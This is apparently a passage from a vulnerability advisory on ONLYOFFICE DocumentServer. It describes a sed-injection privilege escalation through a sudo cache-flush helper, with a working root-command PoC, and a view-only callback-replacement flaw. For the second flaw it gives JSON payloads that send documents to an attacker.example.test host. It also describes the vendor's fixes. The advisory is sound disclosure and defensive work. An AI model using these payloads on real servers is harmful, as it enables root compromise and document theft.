The injected / ends the replacement early, making e a [shell-execution flag](https://www.gnu.org/software/sed/manual/sed.html#The-_0022s_0022-Command). The final;# comments out the helper's appended /g.

After substitution, the template line at \[4\] becomes:

```bash
const ver = '/9.4.0-';id > /tmp/r7-root;#'';
```

The e flag sends this whole line to /bin/sh. The shell tries to run const, which fails, but the semicolon still starts id. Its output is written to /tmp/r7-root, and # comments out the trailing quotes. Because sudo launched the helper as root, id also runs as root.

### Exploitation

From a process running as ds, the attacker supplies a sed expression that terminates the intended replacement, executes a command, and comments out the rest.

For the view-only remote chain, the SaveFile stage writes a command script into /var/www/onlyoffice/Data. The loaded appender invokes /usr/bin/sudo with an argument array, placing /bin/sh /var/www/onlyoffice/Data/r7-command-NONCE.sh in the same sed payload. The helper executes that script as root, and the PoC makes additional /docbuilder requests to read its output.

#### PoC

Run the helper as ds, then read the result:

```bash
sudo /usr/bin/documentserver-flush-cache.sh \
    --hash "';id > \/tmp\/r7-root;#'/e;#" \
    --restart false
cat /tmp/r7-root
uid=0(root) gid=0(root) groups=0(root)
```

The [DocBuilder chain](https://docs.google.com/document/d/1m7Osqdx-sHebh6E-doeM0Ph5lfUCtGyGtqcPtuGkLa8/edit?tab=t.0#heading=h.g3gkj5d1rkfu) invokes this helper remotely through the SaveFile finding.

### Impact

An attacker who compromises DocumentServer's ds process can cross the operating-system privilege boundary and execute as root inside the official container. This scores [**7.8 High**](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H). The tested container lacked a Docker socket, and ds had no effective Linux capabilities.

### Fix

The [10.0.0-169 cache-flush script](https://github.com/ONLYOFFICE/document-server-package/blob/v10.0.0.169/common/documentserver/bin/documentserver-flush-cache.m4#L24-L46) validates HASH before inserting it into the sed expression:

```bash
+case "$HASH" in
+    '') ;;
+    *[!A-Za-z0-9._-]*)
+        echo "documentserver-flush-cache: invalid --hash value '${HASH}': only [A-Za-z0-9._-] characters are allowed" >&2
+        exit 1
+        ;;
+esac
```

The new check rejects characters needed for the sed injection, including /,; and '. The helper was also renamed to documentserver-flush-cache; the [10.0 sudoers file](https://github.com/ONLYOFFICE/document-server-package/blob/v10.0.0.169/common/documentserver/sudoers/documentserver#L3-L9) still allows ds to run it as root without a password.

## View-only sendForm exports non-rendered document data (CVE-2026-113631)

A viewer can reconnect with a valid Session JWT while replacing the callback URL from the signed opening configuration. Because sendForm remains available in view mode, DocumentServer reconstructs the document and sends it to the attacker even when download and form-filling are disabled.

### Technical analysis

**Prerequisite:** The attacker must be authorized to view the target DOCX and connect normally once to receive its Session JWT. DocumentServer must be able to reach the attacker's replacement callback. To disclose more than the viewer displays, the document must contain non-rendered data. No edit, download, copy, print, or form-filling permission is required.

A view-only editor connection receives a server-issued Session JWT for reconnection. [fillJwtByConnection()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/DocsCoServer.js#L535-L565) constructs its payload as follows:

```javascript
const edit = payload.editorConfig;
//todo
//edit.callbackUrl = callbackUrl; // [0] Callback assignment disabled

// ... remaining session fields omitted ...

return yield signToken(ctx, payload, tenTokenSessionAlgorithm, tenTokenSessionExpires / 1000, commonDefines.c_oAscSecretType.Session);
```

The commented-out assignment at \[0\] leaves the original callback URL out of the signed reconnect state. A reconnecting viewer can replace it; after host filtering, DocumentServer stores the replacement as that viewer's callback.

Message authorization and dispatch in [DocsCoServer.js](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/DocsCoServer.js#L1945-L2041) include:

```javascript
// [1] Restricted viewer messages
if (
  (conn.isCloseCoAuthoring || (conn.user && conn.user.view)) &&
  ('getLock' == data.type || 'saveChanges' == data.type || 'isSaveLock' == data.type)
) {
  // ... denial omitted ...
}
// ... other message types omitted ...
case 'rpc':
  yield* startRPC(ctx, conn, data.responseKey, data.data); // [2] RPC dispatch
  break;
```

The view-mode restriction at \[1\] omits rpc, allowing dispatch to startRPC() at \[2\]. The [sendForm branch](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/DocsCoServer.js#L1302-L1333) checks only that conn.user exists; it does not require edit, download, print, form-filling, or export permission. [commandSfcCallback()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/canvasservice.js#L1043-L1230) then sends the reconstructed document to the viewer's replacement callback

The callback request also bypasses the normal private-address filter under the tested defaults. [sendServerRequest()](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/DocService/sources/DocsCoServer.js#L796-L826) marks the URL as JWT-trusted whenever Inbox JWT validation is enabled, even though the replacement URL was not signed. The [HTTP request helper](https://github.com/ONLYOFFICE/server/blob/v9.4.0.129/Common/sources/utils.js#L268-L301) consequently permits a direct request without the private-address filter.

### Exploitation

*Figure 1: View-only document export through a replaced callback.*

#### Obtaining a session JWT

The attacker opens the target DOCX normally with their view-only Editor JWT. The relevant fields in the Socket.IO authentication message retain mode=view and download=false:

```json
{
  "type": "auth",
  "docid": "TARGET_DOCUMENT_KEY",
  "documentCallbackUrl": "SIGNED_INTEGRATOR_CALLBACK",
  "mode": "view",
  "permissions": {
    "download": false
  },
  "jwtOpen": "VIEW_ONLY_EDITOR_JWT",
  "jwtSession": null
}
```

DocumentServer accepts the view-only connection and returns a server-issued Session JWT in its auth message.

#### Replacing the callback

The attacker opens a second Socket.IO connection and authenticates with that Session JWT, but substitutes their own URL for documentCallbackUrl. The relevant changed fields are:

```json
{
  "type": "auth",
  "docid": "TARGET_DOCUMENT_KEY",
  "documentCallbackUrl": "https://attacker.example.test/operator-callback",
  "mode": "view",
  "jwtOpen": null,
  "jwtSession": "SERVER_SESSION_JWT"
}
```

The session remains view-only, but DocumentServer stores the attacker's callback because the Session JWT does not bind the original callback URL. The attacker controls its host, port, path and query string.

#### Forcing document export

Over the reconnected socket, the attacker invokes sendForm directly:

```json
{
  "type": "rpc",
  "responseKey": "ATTACKER_RESPONSE_KEY",
  "data": {
    "type": "sendForm",
    "formdata": {
      "formsdata": []
    }
  }
}
```

The server returns RPC code 0, reconstructs a DOCX, and sends a status 6 callback containing its download URL to the attacker:

```json
{
  "key": "TARGET_DOCUMENT_KEY",
  "status": 6,
  "url": "DOCUMENTSERVER_OUTPUT_URL"
}
```

The attacker downloads that URL. Rapid7 demonstrated the attack with edit, download, print, review,
